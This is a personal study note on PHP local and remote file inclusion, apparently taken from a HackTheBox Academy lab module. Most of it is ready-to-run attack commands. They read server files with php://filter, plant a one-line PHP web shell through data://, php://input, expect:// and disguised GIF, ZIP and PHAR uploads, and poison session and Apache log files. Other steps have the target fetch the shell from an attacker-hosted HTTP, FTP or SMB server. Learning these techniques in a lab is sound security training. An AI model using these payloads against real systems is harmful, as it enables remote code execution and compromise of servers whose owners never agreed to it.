################
File Inclusion
################

2024-12-03 07:50

Status:

Tags: 


*****************
Using PHP filters
*****************

php filters can allow you to view the contents of unreadable files

example 1 : step 1 - find file that you wish to read the source code of:( has no output)

.. code-block:: console

   ffuf -w ~/HTB/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  -u http://94.237.59.180:41191/FUZZ.php

   found configure

Example 2: Use the Conversion Filter to read the file:

.. code-block:: console

   curl http://94.237.59.180:41191/index.php?language=php://filter/read=convert.base64-encode/resource=configure

************************
Using PHP Wrappers
************************

Example 1: Reading a system file

.. code-block:: console

    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

******************************
RCE (Remote code execution)
******************************

This technique users the GET method

Step 1: Encode the shell

.. code-block:: console

   echo '<?php system($_GET["cmd"]); ?>' | base64

*Note: if the system does not take the GET command, encode the payload
in system command.*

Step 2: From a web browser

.. code-block:: console

   http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

Or from CURL

.. code-block:: console

   curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'


******************************
Using the input wrapper
******************************

This technique users the POST method, so it must be enabled on the
server

Example: Using curl

.. code-block:: console

   curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"


******************************
Using the Expect Wrapper
******************************

Rare that this is include. It has to be installed manually. This wrapper
runs code without the shell.

Example:

.. code-block:: console

   curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
   uid=33(www-data) gid=33(www-data) groups=33(www-data)

******************************
Remote File Inclusion (RFI)
******************************

This is normally disabled by default In PHP the ``allow_url_include``
needs to be enabled for this to work.

******************************
Using a web server
******************************

Example 1: To test this try a RFI in the browser request

.. code-block:: console

   http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

If you see it’s own content encapsulated, it is vulnerable.

Example 2: Performing a RFI attack. Step one: Encode a shell

.. code-block:: console

   echo '<?php system($_GET["cmd"]); ?>' > shell.php

Step two: Host this on your server

.. code-block:: console

   sudo python3 -m http.server <LISTENING_PORT>

Step three: Request this shell in the browser

.. code-block:: console

   http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

**Tip:**\ * We can examine the connection on our machine to ensure the
request is being sent as we specified it. For example, if we saw an
extra extension (.php) was appended to the request, then we can omit it
from our payload*

******************************
Using an FTP server
******************************

**Note**\ *: This can also be hosted on your FTP server if http/https is
blocked on a WAF*

.. code-block:: console

   curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'

******************************
Using a SMB server
******************************

Step 1: Start a Samba server
.. code-block::

   impacket-smbserver -smb2support share $(pwd)

Request the shell

.. code-block:: console

   http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami

******************************
File Uploads
******************************

Example 1: Using LFI
Step one: Create the shell with an image extension
.. code-block:: console

   echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

Step two: Upload the file

Step three: Find the image location

Step four: Execute the file

.. code-block:: console

   curl http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

Example 2: Using ZIP files ( Zip wrapper)

https://www.php.net/manual/en/wrappers.compression.php

Step 1: zipping the file

.. code-block:: console

   echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

*Note: If the server inspects and denies ZIP content this may not work*

Step 2: Upload the file

Step 3: Execute the file

.. code-block:: console

   curl http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

Example 3: Using PHAR wrapper

Step 1: Write the following inside of shell.php

.. code-block:: console

   <?php
   $phar = new Phar('shell.phar');
   $phar->startBuffering();
   $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
   $phar->setStub('<?php __HALT_COMPILER(); ?>');

   $phar->stopBuffering();

Step 2: Compile the it into a phar file and rename it to shell.jpg

.. code-block:: console

    php --define phar.readonly=0 shell.php
    mv shell.phar shell.jpg

Step 3: Upload the file to the server

Step 4: Execute it with the phar wrapper

.. code-block:: console

   curl http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

******************************
Poisoning
******************************

===================
Session Poisoning
===================

By URL encoding a shell.

Example: Step 1: urlencode the shell

.. code-block:: console

   urlencode '<?php system($_GET["cmd"]);?>' 

Step 2: Request this as an inclusion

.. code-block:: console

   Browser:  http://94.237.59.180:40783/index.php?language=<urlencoded-string>

Step 3: Using your session id ( add ``sess_`` before it )

.. code-block:: console

   Browser: /var/lib/php/sessions/sess_bpo3d1hh7nbb6p1frr98udaa60&cmd=id

=====================
Server Log Poisoning
=====================

By modifying the user-agent field we can specify a shell that will be
copied to the log.
.. code-block::

   Temen@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

The by requesting the log with:

.. code-block:: console

   curl http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id


=====================
Automated Scanning
=====================

Using :ref:`ffuf <ffuf>` to find parameters


Looking for parameter names to use with your RFI/LFI attacks

.. code-block:: console

   Temen@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' 

===============
LFI Word lists
===============

Download here:
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

Using it with :ref:`ffuf <ffuf>`

.. code-block:: console

   ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

======================
Fuzzing Server Files
======================

Finding the Webroot and structure of the server


Part of Seclists, but can be downloaded for Linux:
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt

And for Windows
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

Example:

.. code-block:: console

   ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'

==================================
Finding the location of the logs
==================================

Example: Using the linux LFI list

.. code-block:: console

   ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'

Example 2: Find logs by asking the conf file

.. code-block:: console

   curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

===================
Common LFI Tools
===================
https://github.com/mzfr/liffy

*************
References
*************

https://academy.hackthebox.com/module/23/section/250
https://www.php.net/manual/en/wrappers.data.php
https://academy.hackthebox.com/module/23/section/253
https://www.php.net/manual/en/wrappers.php.php
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
